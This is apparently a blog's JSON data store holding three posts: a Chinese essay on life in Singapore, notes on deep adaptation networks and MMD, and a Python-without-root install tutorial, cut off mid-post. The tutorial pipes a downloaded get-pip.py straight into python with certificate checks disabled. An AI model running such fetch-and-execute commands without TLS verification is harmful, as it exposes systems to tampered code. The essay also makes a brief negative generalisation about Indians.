正文\n\n又是分外晴朗的一天，狮城晴朗的日子，天空总是蓝得让人想飙脏话，温度也尚可，暖而不燥，还不至于到需要靠空调续命的地步。每每这时就会让人感慨现世安好，除了这个奇怪房东的存在。\n\n这个印度房东的存在就像印度电影中那段冗长乏味用来凑时长的尬舞，有时让人尴尬到无话可说，甚至让我对印度人有了很不好的初印象。本来今日早早回来打算睡觉，却忘记考虑每晚被她以最大声开到快12点钟的电视机，也不觉得她听力差到了那种程度，屡说无果，只得作罢。\n\n虽说由于各种噪声影响，每晚梦魇缠身，混混沌沌，但撇开这些不谈，生活也还是美好的。楼下椰树沉默如一首深情的诗，路边天桥如一条穿越森林的甬道。\n\n我有时会想，若是长久地居住在这里，会不会不再纠结时间的流逝。这里日复一日的漫长夏季，总会给人上一个夏季延续的错觉。\n\n细数已是人生的第二十一个年头了，数载红尘翻身而过，拦也拦不住。之前的那些年岁，总觉得世间动荡，甚至有过这世界不会再好了的念头。然而世界总是没有错的，皆是自己内心动荡不安，对生活又有过分奢望的苛求，事事急不可耐，总是徘徊在失望与希望的边缘，以至于走了很多现在看来不正确的路，做了很多现在回想有些后悔的事情，以及产生过一些现在咀嚼起来有些乏味的情愫。\n\n在狮城已逾一月之久，觉得较之国内，这里的人们都有着某种乐观的气息。想想自己来之前某场考试的前一天，因为老毛病发作，竟在肯德基里边吃饭边落泪，现在想来也不禁哑然一笑。回味那场景，世间的孤独，也大抵如此了吧。\n\n芸芸众生，茫茫人海，想找一个说话的人，却偏寻不得。好不容易寻得了，却偏得不到。\n\n我惊讶于同在一个实验室的越南phd去过好多地方，包括日本和韩国，我还和他在一次闲谈中就南海问题交换了意见，都是些插科打诨的玩笑话。不过我还是很羡慕他励志云游四方的人生态度。\n\n所以，世界那么大，想看就去看吧。缘分多奇妙，想爱就去爱吧。\n\n这世间正好，你也应不错。\n\n","source":"_posts/2017-07-24-merlionRes.markdown","raw":"---\nlayout:     post\ntitle:      \"狮城随笔\"\ntags:\n    - 生活\n---\n\n> “与世界握手言和，与自己重修旧好。”\n\n\n## 正文\n\n又是分外晴朗的一天，狮城晴朗的日子，天空总是蓝得让人想飙脏话，温度也尚可，暖而不燥，还不至于到需要靠空调续命的地步。每每这时就会让人感慨现世安好，除了这个奇怪房东的存在。\n\n这个印度房东的存在就像印度电影中那段冗长乏味用来凑时长的尬舞，有时让人尴尬到无话可说，甚至让我对印度人有了很不好的初印象。本来今日早早回来打算睡觉，却忘记考虑每晚被她以最大声开到快12点钟的电视机，也不觉得她听力差到了那种程度，屡说无果，只得作罢。\n\n虽说由于各种噪声影响，每晚梦魇缠身，混混沌沌，但撇开这些不谈，生活也还是美好的。楼下椰树沉默如一首深情的诗，路边天桥如一条穿越森林的甬道。\n\n我有时会想，若是长久地居住在这里，会不会不再纠结时间的流逝。这里日复一日的漫长夏季，总会给人上一个夏季延续的错觉。\n\n细数已是人生的第二十一个年头了，数载红尘翻身而过，拦也拦不住。之前的那些年岁，总觉得世间动荡，甚至有过这世界不会再好了的念头。然而世界总是没有错的，皆是自己内心动荡不安，对生活又有过分奢望的苛求，事事急不可耐，总是徘徊在失望与希望的边缘，以至于走了很多现在看来不正确的路，做了很多现在回想有些后悔的事情，以及产生过一些现在咀嚼起来有些乏味的情愫。\n\n在狮城已逾一月之久，觉得较之国内，这里的人们都有着某种乐观的气息。想想自己来之前某场考试的前一天，因为老毛病发作，竟在肯德基里边吃饭边落泪，现在想来也不禁哑然一笑。回味那场景，世间的孤独，也大抵如此了吧。\n\n芸芸众生，茫茫人海，想找一个说话的人，却偏寻不得。好不容易寻得了，却偏得不到。\n\n我惊讶于同在一个实验室的越南phd去过好多地方，包括日本和韩国，我还和他在一次闲谈中就南海问题交换了意见，都是些插科打诨的玩笑话。不过我还是很羡慕他励志云游四方的人生态度。\n\n所以，世界那么大，想看就去看吧。缘分多奇妙，想爱就去爱吧。\n\n这世间正好，你也应不错。\n\n","slug":"merlionRes","published":1,"date":"2017-07-23T16:00:00.000Z","updated":"2018-04-23T12:06:21.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizb6000grikes9nkq4j0","content":"<blockquote>\n<p>“与世界握手言和，与自己重修旧好。”</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>又是分外晴朗的一天，狮城晴朗的日子，天空总是蓝得让人想飙脏话，温度也尚可，暖而不燥，还不至于到需要靠空调续命的地步。每每这时就会让人感慨现世安好，除了这个奇怪房东的存在。</p>\n<p>这个印度房东的存在就像印度电影中那段冗长乏味用来凑时长的尬舞，有时让人尴尬到无话可说，甚至让我对印度人有了很不好的初印象。本来今日早早回来打算睡觉，却忘记考虑每晚被她以最大声开到快12点钟的电视机，也不觉得她听力差到了那种程度，屡说无果，只得作罢。</p>\n<p>虽说由于各种噪声影响，每晚梦魇缠身，混混沌沌，但撇开这些不谈，生活也还是美好的。楼下椰树沉默如一首深情的诗，路边天桥如一条穿越森林的甬道。</p>\n<p>我有时会想，若是长久地居住在这里，会不会不再纠结时间的流逝。这里日复一日的漫长夏季，总会给人上一个夏季延续的错觉。</p>\n<p>细数已是人生的第二十一个年头了，数载红尘翻身而过，拦也拦不住。之前的那些年岁，总觉得世间动荡，甚至有过这世界不会再好了的念头。然而世界总是没有错的，皆是自己内心动荡不安，对生活又有过分奢望的苛求，事事急不可耐，总是徘徊在失望与希望的边缘，以至于走了很多现在看来不正确的路，做了很多现在回想有些后悔的事情，以及产生过一些现在咀嚼起来有些乏味的情愫。</p>\n<p>在狮城已逾一月之久，觉得较之国内，这里的人们都有着某种乐观的气息。想想自己来之前某场考试的前一天，因为老毛病发作，竟在肯德基里边吃饭边落泪，现在想来也不禁哑然一笑。回味那场景，世间的孤独，也大抵如此了吧。</p>\n<p>芸芸众生，茫茫人海，想找一个说话的人，却偏寻不得。好不容易寻得了，却偏得不到。</p>\n<p>我惊讶于同在一个实验室的越南phd去过好多地方，包括日本和韩国，我还和他在一次闲谈中就南海问题交换了意见，都是些插科打诨的玩笑话。不过我还是很羡慕他励志云游四方的人生态度。</p>\n<p>所以，世界那么大，想看就去看吧。缘分多奇妙，想爱就去爱吧。</p>\n<p>这世间正好，你也应不错。</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“与世界握手言和，与自己重修旧好。”</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>又是分外晴朗的一天，狮城晴朗的日子，天空总是蓝得让人想飙脏话，温度也尚可，暖而不燥，还不至于到需要靠空调续命的地步。每每这时就会让人感慨现世安好，除了这个奇怪房东的存在。</p>\n<p>这个印度房东的存在就像印度电影中那段冗长乏味用来凑时长的尬舞，有时让人尴尬到无话可说，甚至让我对印度人有了很不好的初印象。本来今日早早回来打算睡觉，却忘记考虑每晚被她以最大声开到快12点钟的电视机，也不觉得她听力差到了那种程度，屡说无果，只得作罢。</p>\n<p>虽说由于各种噪声影响，每晚梦魇缠身，混混沌沌，但撇开这些不谈，生活也还是美好的。楼下椰树沉默如一首深情的诗，路边天桥如一条穿越森林的甬道。</p>\n<p>我有时会想，若是长久地居住在这里，会不会不再纠结时间的流逝。这里日复一日的漫长夏季，总会给人上一个夏季延续的错觉。</p>\n<p>细数已是人生的第二十一个年头了，数载红尘翻身而过，拦也拦不住。之前的那些年岁，总觉得世间动荡，甚至有过这世界不会再好了的念头。然而世界总是没有错的，皆是自己内心动荡不安，对生活又有过分奢望的苛求，事事急不可耐，总是徘徊在失望与希望的边缘，以至于走了很多现在看来不正确的路，做了很多现在回想有些后悔的事情，以及产生过一些现在咀嚼起来有些乏味的情愫。</p>\n<p>在狮城已逾一月之久，觉得较之国内，这里的人们都有着某种乐观的气息。想想自己来之前某场考试的前一天，因为老毛病发作，竟在肯德基里边吃饭边落泪，现在想来也不禁哑然一笑。回味那场景，世间的孤独，也大抵如此了吧。</p>\n<p>芸芸众生，茫茫人海，想找一个说话的人，却偏寻不得。好不容易寻得了，却偏得不到。</p>\n<p>我惊讶于同在一个实验室的越南phd去过好多地方，包括日本和韩国，我还和他在一次闲谈中就南海问题交换了意见，都是些插科打诨的玩笑话。不过我还是很羡慕他励志云游四方的人生态度。</p>\n<p>所以，世界那么大，想看就去看吧。缘分多奇妙，想爱就去爱吧。</p>\n<p>这世间正好，你也应不错。</p>\n"},{"layout":"post","title":"Learning Transferanle Features with Deep Adapation Networks","_content":"\n> “It's a good habite to take notes”\n\n\n## 前言\n\nYou can find the related paper from the following address.\n\n[Learning Transferable Features with Deep Adaptation Networks](http://jmlr.org/proceedings/papers/v37/long15.pdf)(1)\n\n[How transferable are features in deep neural networks?](http://papers.nips.cc/paper/5347-how-transferable-are-features-in-deep-neural-networks.pdf)(2)\n\n[A Kernel Two-Sample Test](http://jmlr.org/papers/volume13/gretton12a/gretton12a.pdf)(3)\n\n---\n\n## 正文\n\nDeep neutral network can learn transferable transferable features which generalize well to novel tasks for domain adaptation.(1)\n\nThe usual transfer learning approach is to train a base network and then copy its first n layers to the first n layers of a target network. The remaining layers of the target network are then randomly initialized toword the target task. (2)\n\nHere comes some related terms.\n\n### RKHS \n\nRHKS means reproducing kernel Hilbert space.(再生核希尔伯特空间)\n\nFirst Hilbert space, it is a generalization of Euclidean space. Beginning with the basic vector space, define an  inner product operation in this vector space, the space will be upgraded to an inner product space. The norm is defined:\n\n\\begin{aligned} \\|x\\|^2=\\langle x, x\\rangle \\end{aligned}\n\nSo, it becomes an normed vector space. Norms can define a metric:\n\n\\begin{aligned} d(x_1,x_2) = \\|x_1-x_2\\| \\end{aligned}\n\nThen it becomes a metic space. If it is complete under this metric, the space is called Hilbert Space. In brief, Hilbert space is a complete inner product space.\n\nThen retroducing kernel.\n\nRemember in SVM, when the dataset is not linearly separable, we map the data point to a higher dimesional space and the data may become linearly separable. This higer dimentional space is called \"reproducing kernel Hilbert space\". However, it is usually hard to figure out the mapping function because the growth of dimentional number is explosive. Here we need **Kernel Function** to handel this problem. It calculates inner product of two vectors in RKHS. \n\nOne useful property is that the same demensional space is isomorphic to each other, which means the inner product, norm, metric and vector operations, etc. can be maintained in the conversion between different space.\n\n### MMD \n\nMMD means maximum mean discrepancy.(最大平均差异) It is used to determine whether the two distributions **p** and **q** are the same. For all the function f whose input is the sample space complying with the certain distribution, if the mean value is same, we assume those two distritions are the same.\n\nOr rather, by finding a continuous function f in the sample space, we get two mean value with different distribution. Then we get **mean discrepancy** by subtracting. Find a f to maximum the mean discrepancy and we get MMD.\n\nFor a two-sample test, there are two hypotheses. Null hypothesis: p = q. The alternative hypothesis: p != q.\n\nIn RKHS, we have:(3)\n\n\\begin{aligned} MMD^2[f,p,q]=\\|\\mu_{p}-\\mu_{q}\\|^2_{H} \\end{aligned}\n\n### MK-MMD\n\nMK-MMD means multiple kernel variant of MMD and it minimize Type two error.\n\n* Type one error: 存伪\n* Type two error: 弃真\n\n---\n\n### Model(DAN)\n\n![img](/images/in-post/post-blog-DANmdoel.png)\n\nThe basic architecture is **AlexNet**, which is comprised of five convolutional layers (conv1-conv5) and three fully connected layers (fc6-fc8). The output layer is softmax.\n\nBecause features in lower convolutional layers are general, the author starts with an AlexNet model pertained on ImageNet 2012 and copies conv1-conv3 from pertained model, then fine-tunes conv4-conv5 and fully connected layers fc6-fc7, and trains classifier layer fc8, both via backpropagation.\n\nThe author adds an MK-MMD-based multi-layer adaptation regularizer to CNN risk so that the distributions on the source and target become similar under the hidden representations of fully connected layers fc6-fc8.\n","source":"_posts/2017-02-05-LTFwDAN.markdown","raw":"---\nlayout:     post\ntitle:      \"Learning Transferanle Features with Deep Adapation Networks\"\ntags:\n    - Notes\n---\n\n> “It's a good habite to take notes”\n\n\n## 前言\n\nYou can find the related paper from the following address.\n\n[Learning Transferable Features with Deep Adaptation Networks](http://jmlr.org/proceedings/papers/v37/long15.pdf)(1)\n\n[How transferable are features in deep neural networks?](http://papers.nips.cc/paper/5347-how-transferable-are-features-in-deep-neural-networks.pdf)(2)\n\n[A Kernel Two-Sample Test](http://jmlr.org/papers/volume13/gretton12a/gretton12a.pdf)(3)\n\n---\n\n## 正文\n\nDeep neutral network can learn transferable transferable features which generalize well to novel tasks for domain adaptation.(1)\n\nThe usual transfer learning approach is to train a base network and then copy its first n layers to the first n layers of a target network. The remaining layers of the target network are then randomly initialized toword the target task. (2)\n\nHere comes some related terms.\n\n### RKHS \n\nRHKS means reproducing kernel Hilbert space.(再生核希尔伯特空间)\n\nFirst Hilbert space, it is a generalization of Euclidean space. Beginning with the basic vector space, define an  inner product operation in this vector space, the space will be upgraded to an inner product space. The norm is defined:\n\n\\begin{aligned} \\|x\\|^2=\\langle x, x\\rangle \\end{aligned}\n\nSo, it becomes an normed vector space. Norms can define a metric:\n\n\\begin{aligned} d(x_1,x_2) = \\|x_1-x_2\\| \\end{aligned}\n\nThen it becomes a metic space. If it is complete under this metric, the space is called Hilbert Space. In brief, Hilbert space is a complete inner product space.\n\nThen retroducing kernel.\n\nRemember in SVM, when the dataset is not linearly separable, we map the data point to a higher dimesional space and the data may become linearly separable. This higer dimentional space is called \"reproducing kernel Hilbert space\". However, it is usually hard to figure out the mapping function because the growth of dimentional number is explosive. Here we need **Kernel Function** to handel this problem. It calculates inner product of two vectors in RKHS. \n\nOne useful property is that the same demensional space is isomorphic to each other, which means the inner product, norm, metric and vector operations, etc. can be maintained in the conversion between different space.\n\n### MMD \n\nMMD means maximum mean discrepancy.(最大平均差异) It is used to determine whether the two distributions **p** and **q** are the same. For all the function f whose input is the sample space complying with the certain distribution, if the mean value is same, we assume those two distritions are the same.\n\nOr rather, by finding a continuous function f in the sample space, we get two mean value with different distribution. Then we get **mean discrepancy** by subtracting. Find a f to maximum the mean discrepancy and we get MMD.\n\nFor a two-sample test, there are two hypotheses. Null hypothesis: p = q. The alternative hypothesis: p != q.\n\nIn RKHS, we have:(3)\n\n\\begin{aligned} MMD^2[f,p,q]=\\|\\mu_{p}-\\mu_{q}\\|^2_{H} \\end{aligned}\n\n### MK-MMD\n\nMK-MMD means multiple kernel variant of MMD and it minimize Type two error.\n\n* Type one error: 存伪\n* Type two error: 弃真\n\n---\n\n### Model(DAN)\n\n![img](/images/in-post/post-blog-DANmdoel.png)\n\nThe basic architecture is **AlexNet**, which is comprised of five convolutional layers (conv1-conv5) and three fully connected layers (fc6-fc8). The output layer is softmax.\n\nBecause features in lower convolutional layers are general, the author starts with an AlexNet model pertained on ImageNet 2012 and copies conv1-conv3 from pertained model, then fine-tunes conv4-conv5 and fully connected layers fc6-fc7, and trains classifier layer fc8, both via backpropagation.\n\nThe author adds an MK-MMD-based multi-layer adaptation regularizer to CNN risk so that the distributions on the source and target become similar under the hidden representations of fully connected layers fc6-fc8.\n","slug":"LTFwDAN","published":1,"date":"2017-02-04T16:00:00.000Z","updated":"2018-04-23T12:03:10.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizb7000iriked2q3e3qf","content":"<blockquote>\n<p>“It’s a good habite to take notes”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>You can find the related paper from the following address.</p>\n<p><a href=\"http://jmlr.org/proceedings/papers/v37/long15.pdf\" target=\"_blank\" rel=\"noopener\">Learning Transferable Features with Deep Adaptation Networks</a>(1)</p>\n<p><a href=\"http://papers.nips.cc/paper/5347-how-transferable-are-features-in-deep-neural-networks.pdf\" target=\"_blank\" rel=\"noopener\">How transferable are features in deep neural networks?</a>(2)</p>\n<p><a href=\"http://jmlr.org/papers/volume13/gretton12a/gretton12a.pdf\" target=\"_blank\" rel=\"noopener\">A Kernel Two-Sample Test</a>(3)</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>Deep neutral network can learn transferable transferable features which generalize well to novel tasks for domain adaptation.(1)</p>\n<p>The usual transfer learning approach is to train a base network and then copy its first n layers to the first n layers of a target network. The remaining layers of the target network are then randomly initialized toword the target task. (2)</p>\n<p>Here comes some related terms.</p>\n<h3 id=\"RKHS\"><a href=\"#RKHS\" class=\"headerlink\" title=\"RKHS\"></a>RKHS</h3><p>RHKS means reproducing kernel Hilbert space.(再生核希尔伯特空间)</p>\n<p>First Hilbert space, it is a generalization of Euclidean space. Beginning with the basic vector space, define an  inner product operation in this vector space, the space will be upgraded to an inner product space. The norm is defined:</p>\n<p>\\begin{aligned} |x|^2=\\langle x, x\\rangle \\end{aligned}</p>\n<p>So, it becomes an normed vector space. Norms can define a metric:</p>\n<p>\\begin{aligned} d(x_1,x_2) = |x_1-x_2| \\end{aligned}</p>\n<p>Then it becomes a metic space. If it is complete under this metric, the space is called Hilbert Space. In brief, Hilbert space is a complete inner product space.</p>\n<p>Then retroducing kernel.</p>\n<p>Remember in SVM, when the dataset is not linearly separable, we map the data point to a higher dimesional space and the data may become linearly separable. This higer dimentional space is called “reproducing kernel Hilbert space”. However, it is usually hard to figure out the mapping function because the growth of dimentional number is explosive. Here we need <strong>Kernel Function</strong> to handel this problem. It calculates inner product of two vectors in RKHS. </p>\n<p>One useful property is that the same demensional space is isomorphic to each other, which means the inner product, norm, metric and vector operations, etc. can be maintained in the conversion between different space.</p>\n<h3 id=\"MMD\"><a href=\"#MMD\" class=\"headerlink\" title=\"MMD\"></a>MMD</h3><p>MMD means maximum mean discrepancy.(最大平均差异) It is used to determine whether the two distributions <strong>p</strong> and <strong>q</strong> are the same. For all the function f whose input is the sample space complying with the certain distribution, if the mean value is same, we assume those two distritions are the same.</p>\n<p>Or rather, by finding a continuous function f in the sample space, we get two mean value with different distribution. Then we get <strong>mean discrepancy</strong> by subtracting. Find a f to maximum the mean discrepancy and we get MMD.</p>\n<p>For a two-sample test, there are two hypotheses. Null hypothesis: p = q. The alternative hypothesis: p != q.</p>\n<p>In RKHS, we have:(3)</p>\n<p>\\begin{aligned} MMD^2[f,p,q]=|\\mu_{p}-\\mu_{q}|^2_{H} \\end{aligned}</p>\n<h3 id=\"MK-MMD\"><a href=\"#MK-MMD\" class=\"headerlink\" title=\"MK-MMD\"></a>MK-MMD</h3><p>MK-MMD means multiple kernel variant of MMD and it minimize Type two error.</p>\n<ul>\n<li>Type one error: 存伪</li>\n<li>Type two error: 弃真</li>\n</ul>\n<hr>\n<h3 id=\"Model-DAN\"><a href=\"#Model-DAN\" class=\"headerlink\" title=\"Model(DAN)\"></a>Model(DAN)</h3><p><img src=\"/images/in-post/post-blog-DANmdoel.png\" alt=\"img\"></p>\n<p>The basic architecture is <strong>AlexNet</strong>, which is comprised of five convolutional layers (conv1-conv5) and three fully connected layers (fc6-fc8). The output layer is softmax.</p>\n<p>Because features in lower convolutional layers are general, the author starts with an AlexNet model pertained on ImageNet 2012 and copies conv1-conv3 from pertained model, then fine-tunes conv4-conv5 and fully connected layers fc6-fc7, and trains classifier layer fc8, both via backpropagation.</p>\n<p>The author adds an MK-MMD-based multi-layer adaptation regularizer to CNN risk so that the distributions on the source and target become similar under the hidden representations of fully connected layers fc6-fc8.</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“It’s a good habite to take notes”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>You can find the related paper from the following address.</p>\n<p><a href=\"http://jmlr.org/proceedings/papers/v37/long15.pdf\" target=\"_blank\" rel=\"noopener\">Learning Transferable Features with Deep Adaptation Networks</a>(1)</p>\n<p><a href=\"http://papers.nips.cc/paper/5347-how-transferable-are-features-in-deep-neural-networks.pdf\" target=\"_blank\" rel=\"noopener\">How transferable are features in deep neural networks?</a>(2)</p>\n<p><a href=\"http://jmlr.org/papers/volume13/gretton12a/gretton12a.pdf\" target=\"_blank\" rel=\"noopener\">A Kernel Two-Sample Test</a>(3)</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>Deep neutral network can learn transferable transferable features which generalize well to novel tasks for domain adaptation.(1)</p>\n<p>The usual transfer learning approach is to train a base network and then copy its first n layers to the first n layers of a target network. The remaining layers of the target network are then randomly initialized toword the target task. (2)</p>\n<p>Here comes some related terms.</p>\n<h3 id=\"RKHS\"><a href=\"#RKHS\" class=\"headerlink\" title=\"RKHS\"></a>RKHS</h3><p>RHKS means reproducing kernel Hilbert space.(再生核希尔伯特空间)</p>\n<p>First Hilbert space, it is a generalization of Euclidean space. Beginning with the basic vector space, define an  inner product operation in this vector space, the space will be upgraded to an inner product space. The norm is defined:</p>\n<p>\\begin{aligned} |x|^2=\\langle x, x\\rangle \\end{aligned}</p>\n<p>So, it becomes an normed vector space. Norms can define a metric:</p>\n<p>\\begin{aligned} d(x_1,x_2) = |x_1-x_2| \\end{aligned}</p>\n<p>Then it becomes a metic space. If it is complete under this metric, the space is called Hilbert Space. In brief, Hilbert space is a complete inner product space.</p>\n<p>Then retroducing kernel.</p>\n<p>Remember in SVM, when the dataset is not linearly separable, we map the data point to a higher dimesional space and the data may become linearly separable. This higer dimentional space is called “reproducing kernel Hilbert space”. However, it is usually hard to figure out the mapping function because the growth of dimentional number is explosive. Here we need <strong>Kernel Function</strong> to handel this problem. It calculates inner product of two vectors in RKHS. </p>\n<p>One useful property is that the same demensional space is isomorphic to each other, which means the inner product, norm, metric and vector operations, etc. can be maintained in the conversion between different space.</p>\n<h3 id=\"MMD\"><a href=\"#MMD\" class=\"headerlink\" title=\"MMD\"></a>MMD</h3><p>MMD means maximum mean discrepancy.(最大平均差异) It is used to determine whether the two distributions <strong>p</strong> and <strong>q</strong> are the same. For all the function f whose input is the sample space complying with the certain distribution, if the mean value is same, we assume those two distritions are the same.</p>\n<p>Or rather, by finding a continuous function f in the sample space, we get two mean value with different distribution. Then we get <strong>mean discrepancy</strong> by subtracting. Find a f to maximum the mean discrepancy and we get MMD.</p>\n<p>For a two-sample test, there are two hypotheses. Null hypothesis: p = q. The alternative hypothesis: p != q.</p>\n<p>In RKHS, we have:(3)</p>\n<p>\\begin{aligned} MMD^2[f,p,q]=|\\mu_{p}-\\mu_{q}|^2_{H} \\end{aligned}</p>\n<h3 id=\"MK-MMD\"><a href=\"#MK-MMD\" class=\"headerlink\" title=\"MK-MMD\"></a>MK-MMD</h3><p>MK-MMD means multiple kernel variant of MMD and it minimize Type two error.</p>\n<ul>\n<li>Type one error: 存伪</li>\n<li>Type two error: 弃真</li>\n</ul>\n<hr>\n<h3 id=\"Model-DAN\"><a href=\"#Model-DAN\" class=\"headerlink\" title=\"Model(DAN)\"></a>Model(DAN)</h3><p><img src=\"/images/in-post/post-blog-DANmdoel.png\" alt=\"img\"></p>\n<p>The basic architecture is <strong>AlexNet</strong>, which is comprised of five convolutional layers (conv1-conv5) and three fully connected layers (fc6-fc8). The output layer is softmax.</p>\n<p>Because features in lower convolutional layers are general, the author starts with an AlexNet model pertained on ImageNet 2012 and copies conv1-conv3 from pertained model, then fine-tunes conv4-conv5 and fully connected layers fc6-fc7, and trains classifier layer fc8, both via backpropagation.</p>\n<p>The author adds an MK-MMD-based multi-layer adaptation regularizer to CNN risk so that the distributions on the source and target become similar under the hidden representations of fully connected layers fc6-fc8.</p>\n"},{"layout":"post","title":"Install Python and Pip without Root","_content":"\n> “配环境什么的最烦了。”\n\n## 前言\n\n使用Linux最坏的情况就是没有root权限，然而这种情况普遍存在于ssh到服务器的时候。当然不赋予root权限是出于安全性的考虑，此时我的脑海中又浮现出那个场景…那日秋风萧瑟，残阳滴血，红铜铁马，万古如昨，tian哥以super_user的身份敲下了enter，那一键荡气回肠，然后老师的服务器就宕机了。咳咳，扯远了。。\n\n且说我遇到的问题是，需要登录的服务器是一个集群 (和SJTU的pi集群类似)，运行程序时需将其提交至一个节点(node)来运行，但是我发现自己本地的python(2.7.5)版本与node上的python(2.7.13)版本并不一致… (不是很懂这种设计的初衷是什么-_-\\\\)，从log error看似乎是两个版本python不兼容，程序试图从我的本地import一些模块，然而模块报错了。这么一个性能怪兽没法使用真是难受，于是就起了重装python的念头。\n\n\n## 正文\n\n具体流程如下\n\n### 1.Compile python in local directory\n\n```shell\nmkdir ~/python \ncd ~/python\nwget https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tgz\ntar zxfv Python-2.7.13.tgz\nfind ~/python -type d | xargs chmod 0755\ncd Python-2.7.13\n```\n\n我选择的安装目录是\"~/python\"。解压完进入文件夹，接下就是编译了\n\n```shell\n./configure --prefix=$HOME/python\nmake && make install\n```\n\n*$HOME/python* 是引导其安装在自己的目录里(即就是~/python)，否则默认安装路径在/usr下，一般用户没有权限读写此文件夹。\n\n编译完成后需要让系统知道python的安装位置，vim打开~/.bashrc_profile设置如下环境变量。这里默认一般服务器使用bash，其他类似。\n\n```shell\nexport PATH=$HOME/python/Python-2.7.13/:$PATH\nexport PYTHONPATH=$HOME/python/Python-2.7.13\n```\n\n然后使用 *source* 让环境变量生效\n\n```shell\nsource ~/.bashrc_profile\n```\n\n这里可以使用 *which python* 确认一下位置，正确应该返\n\n```shell\n~/python/Python-2.7.13/python\n```\n\n### 2.Install pip\n\nPip是python常用的包管理器，使用还算方便，顺手安装。\n\n```shell\nwget --no-check-certificate https://bootstrap.pypa.io/get-pip.py -O - | python - --user\n```\n\n运行完后，去~/.bashrc_profile里添加\n\n```shell\nexport PATH=$HOME/.local/bin:$PATH\n```\n\n同时使用 *source* 使其生效。同理可以用 *which pip* 看看安装位置，正确应返回\n\n```shell\n~/.local/bin/pip\n```\n\n## 遇到的问题\n\n一共编译三次，虽然每次都提醒 “your build may be uncompleted” 但最后一次使用pip安装了需要的包后基本正常，可以使用。\n\n第一次编译完后，安装theano，调用时显示如下错误\n\n```shell\nException: Compilation failed (return status=1):\n/usr/bin/ld:/usr/local/lib/libpython2.7.a(abstract.o):\nrelocation R_X86_64_32 against 'a local symbol'can not be used\nwhen making a shared object; recompile with -fPIC.\n/usr/local/lib/libpython2.7.a: could not read symbols: Bad\nvalue. collect2: ld returned 1 exit status.\n```\n\n似乎是python没编译好，报错建议 “recompile with -fPIC”，于是添加这个选项重新编译\n\n```shell\n./configure --prefix=$HOME/python -enable-shared CFLAGS=-fPIC \nmake && make install\n```\n\n这次编译完后，python直接无法使用了。于是把~/python目录清空，重新解压，第三次编译，不使用“fPIC”。\n\n```shell\n./configure --prefix=$HOME/python\nmake && make install\n```\n\n至于第三次为什么没有严重错误，自己也不是十分清楚，但也不能归于玄学范畴。我猜测第一次失败可能是之前2.7.5版本python的各种库依然存在，虽然reinstall过了，但不能保证没有遗漏。进行第三次前对旧文件删除的比较彻底，所有的模块都重新安装，于是没有产生致命错误。\n\n","source":"_posts/2017-08-29-pyworoot.markdown","raw":"---\nlayout:     post\ntitle:      \"Install Python and Pip without Root\"\ntags:\n    - Python\n---\n\n> “配环境什么的最烦了。”\n\n## 前言\n\n使用Linux最坏的情况就是没有root权限，然而这种情况普遍存在于ssh到服务器的时候。当然不赋予root权限是出于安全性的考虑，此时我的脑海中又浮现出那个场景…那日秋风萧瑟，残阳滴血，红铜铁马，万古如昨，tian哥以super_user的身份敲下了enter，那一键荡气回肠，然后老师的服务器就宕机了。咳咳，扯远了。。\n\n且说我遇到的问题是，需要登录的服务器是一个集群 (和SJTU的pi集群类似)，运行程序时需将其提交至一个节点(node)来运行，但是我发现自己本地的python(2.7.5)版本与node上的python(2.7.13)版本并不一致… (不是很懂这种设计的初衷是什么-_-\\\\)，从log error看似乎是两个版本python不兼容，程序试图从我的本地import一些模块，然而模块报错了。这么一个性能怪兽没法使用真是难受，于是就起了重装python的念头。\n\n\n## 正文\n\n具体流程如下\n\n### 1.Compile python in local directory\n\n```shell\nmkdir ~/python \ncd ~/python\nwget https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tgz\ntar zxfv Python-2.7.13.tgz\nfind ~/python -type d | xargs chmod 0755\ncd Python-2.7.13\n```\n\n我选择的安装目录是\"~/python\"。解压完进入文件夹，接下就是编译了\n\n```shell\n./configure --prefix=$HOME/python\nmake && make install\n```\n\n*$HOME/python* 是引导其安装在自己的目录里(即就是~/python)，否则默认安装路径在/usr下，一般用户没有权限读写此文件夹。\n\n编译完成后需要让系统知道python的安装位置，vim打开~/.bashrc_profile设置如下环境变量。这里默认一般服务器使用bash，其他类似。\n\n```shell\nexport PATH=$HOME/python/Python-2.7.13/:$PATH\nexport PYTHONPATH=$HOME/python/Python-2.7.13\n```\n\n然后使用 *source* 让环境变量生效\n\n```shell\nsource ~/.bashrc_profile\n```\n\n这里可以使用 *which python* 确认一下位置，正确应该返\n\n```shell\n~/python/Python-2.7.13/python\n```\n\n### 2.Install pip\n\nPip是python常用的包管理器，使用还算方便，顺手安装。\n\n```shell\nwget --no-check-certificate https://bootstrap.pypa.io/get-pip.py -O - | python - --user\n```\n\n运行完后，去~/.bashrc_profile里添加\n\n```shell\nexport PATH=$HOME/.local/bin:$PATH\n```\n\n同时使用 *source* 使其生效。同理可以用 *which pip* 看看安装位置，正确应返回\n\n```shell\n~/.local/bin/pip\n```\n\n## 遇到的问题\n\n一共编译三次，虽然每次都提醒 “your build may be uncompleted” 但最后一次使用pip安装了需要的包后基本正常，可以使用。\n\n第一次编译完后，安装theano，调用时显示如下错误\n\n```shell\nException: 